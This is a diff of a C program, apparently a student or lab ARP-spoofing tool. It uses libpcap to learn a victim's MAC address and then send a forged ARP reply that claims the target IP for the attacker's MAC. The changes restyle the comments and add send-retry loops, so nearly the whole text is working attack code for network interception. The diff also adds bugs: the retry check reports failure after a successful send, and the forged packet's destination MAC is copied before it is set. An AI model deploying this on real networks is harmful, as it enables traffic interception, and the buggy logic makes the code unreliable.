@@ -23,7 +23,9 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    /************************** Open Handle *************************/
+    /////////////////////////////////////////////////////////////////////
+    // Open Handle
+    /////////////////////////////////////////////////////////////////////
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
@@ -33,11 +35,17 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    /*************** Declear the ARP packet structure ***************/
+    /////////////////////////////////////////////////////////////////////
+    // Declear the ARP packet structure
+    /////////////////////////////////////////////////////////////////////
     struct arp_packet ap;
     memset(&ap, 0, sizeof(ap));
 
-    /*************************** Get My IP **************************/
+    uint8_t sender_mac[6] = {0, };  // declear to make the code simplify
+
+    /////////////////////////////////////////////////////////////////////
+    // Get My IP
+    /////////////////////////////////////////////////////////////////////
     /*{
         // https://technote.kr/176 [TechNote.kr]
         struct ifreq ifr;
@@ -72,7 +80,9 @@ int main(int argc, char* argv[])
         }
     }*/
 
-    /******************** Set ARP-Request Packet ********************/
+    /////////////////////////////////////////////////////////////////////
+    // Set ARP-Request Packet
+    /////////////////////////////////////////////////////////////////////
     {
         memset(ap.e.ether_dhost, 0xFF, sizeof(ap.e.ether_dhost));
         GetSvrMacAddress(ap.e.ether_shost);
@@ -85,48 +95,61 @@ int main(int argc, char* argv[])
         ap.a.ar_op  = htons(ARPOP_REQUEST);
 
         GetSvrMacAddress(ap.sdr_mac);               // my mac
-//      memset(ap.sdr_ip, 0, sizeof(ap.sdr_ip));    // my ip
+//      ap.sdr_ip = 0;                              // my ip
 //      memset(ap.tgt_mac, 0, sizeof(ap.tgt_mac));  // sender's mac
-        ip_from_str(ap.tgt_ip, argv[2]);            // sender's ip
-    }    
+        ap.tgt_ip = inet_addr(argv[2]);             // sender's ip
+    }
     {
         printf("ARP-Broadcasting Packet\n");
-        dump((void*)&ap, sizeof(ap));
+        dump((uint8_t*)&ap, sizeof(ap));
     }
 
-    /******************** Send ARP-Request Packet *******************/
-    if(pcap_sendpacket(handle, (const u_char*)&ap, sizeof(ap)) != 0)
+    /////////////////////////////////////////////////////////////////////
+    // Send ARP-Request Packet
+    /////////////////////////////////////////////////////////////////////
     {
-        fprintf(stderr, "couldn't send the packet to %s\n", ap.tgt_ip);
-        pcap_close(handle);
-        return -1;
+        int send_cnt = 3;
+
+        while(send_cnt-- && pcap_sendpacket(handle, (const uint8_t*)&ap, sizeof(ap)))
+        {
+            sleep(1);
+        }
+
+        if(send_cnt)
+        {
+            // return if it ended after three times of loop
+            fprintf(stderr, "couldn't send the packet\n");
+            pcap_close(handle);
+            return -1;
+        }
     }
 
-    /*********************** Get Sender's MAC ***********************/
+    /////////////////////////////////////////////////////////////////////
+    // Get Sender's MAC
+    /////////////////////////////////////////////////////////////////////
     {
         while(true)
         {
             struct pcap_pkthdr* header;
-            const u_char* packet;
+            const uint8_t* packet;
             int res = pcap_next_ex(handle, &header, &packet);
             if (res == 0) continue;
             if (res == -1 || res == -2) break;
 
-            const u_char tmp_mac[6] = {0, };    // Sender's mac
-            memcpy((void*)tmp_mac, packet, sizeof(tmp_mac));
-
-            if( is_same_mac(tmp_mac, ap.sdr_mac) && is_reply_arp_packet(packet)
-                    && is_same_ip(ap.tgt_ip, (u_char*)&packet[LIBNET_ETH_H + LIBNET_ARP_H + sizeof(ap.sdr_mac)]))
+            // check three things: my_mac == dst_mac && is_arp_reply packet && src_ip == sender_ip
+            if(!memcmp(&packet[0], ap.sdr_mac, MAC_SIZE) && is_reply_arp_packet(packet)
+                    && !memcmp(&ap.tgt_ip, &packet[LIBNET_ETH_H + LIBNET_ARP_H + sizeof(ap.sdr_mac)], IP_SIZE))
             {
                 // Store sender's mac in Ethernet packet.
-                memcpy((void*)ap.tgt_mac, &packet[LIBNET_ETH_H + LIBNET_ARP_H], sizeof(ap.sdr_mac));
+                memcpy(&sender_mac, &packet[LIBNET_ETH_H + LIBNET_ARP_H], MAC_SIZE);
                 break;
             }
-            //
         }
     }
 
-    /********************** Print Address Info **********************/
+    /////////////////////////////////////////////////////////////////////
+    // Print Address Info
+    /////////////////////////////////////////////////////////////////////
     {
         printf("[Address Information]");
 
@@ -138,26 +161,42 @@ int main(int argc, char* argv[])
         printf("Attacker's MAC:\t");    print_mac(ap.sdr_mac);  putchar('\n');
     }
 
-    /********************** Set Fake-ARP Packet *********************/
+    /////////////////////////////////////////////////////////////////////
+    // Set Fake-ARP Packet
+    /////////////////////////////////////////////////////////////////////
     {
         memcpy(ap.e.ether_dhost, ap.tgt_mac, sizeof(ap.e.ether_dhost)); // Store sender's mac
-        ip_from_str(ap.sdr_ip, argv[3]);                                // Store target's ip
         ap.a.ar_op  = htons(ARPOP_REPLY);                               // Change the op-code
+        ap.sdr_ip = inet_addr(argv[3]);                                 // Change target's ip
+        memcpy(ap.tgt_mac, &sender_mac, MAC_SIZE);                       // Store sender's ip
     }
     {
         printf("Fake ARP Packet\n");
-        dump((void*)&ap, sizeof(ap));
+        dump((uint8_t*)&ap, sizeof(ap));
     }
 
-    /********************* Send Fake-ARP Packet *********************/
-    if(pcap_sendpacket(handle, (const u_char*)&ap, sizeof(ap)) != 0)
+    /////////////////////////////////////////////////////////////////////
+    // Send Fake-ARP Packet
+    /////////////////////////////////////////////////////////////////////
     {
-        fprintf(stderr, "couldn't send the packet to %s\n", ap.sdr_ip);
-        pcap_close(handle);
-        return -1;
+        int send_cnt = 3;
+
+        while( send_cnt-- && pcap_sendpacket(handle, (const uint8_t*)&ap, sizeof(ap)) )
+        {
+            sleep(1);
+        }
+
+        if(send_cnt)
+        {
+            fprintf(stderr, "couldn't send the packet\n");
+            pcap_close(handle);
+            return -1;
+        }
     }
 
-    /******************** Close handle and return *******************/
+    /////////////////////////////////////////////////////////////////////
+    // Close handle and return
+    /////////////////////////////////////////////////////////////////////
     pcap_close(handle);
     return 0;
 }
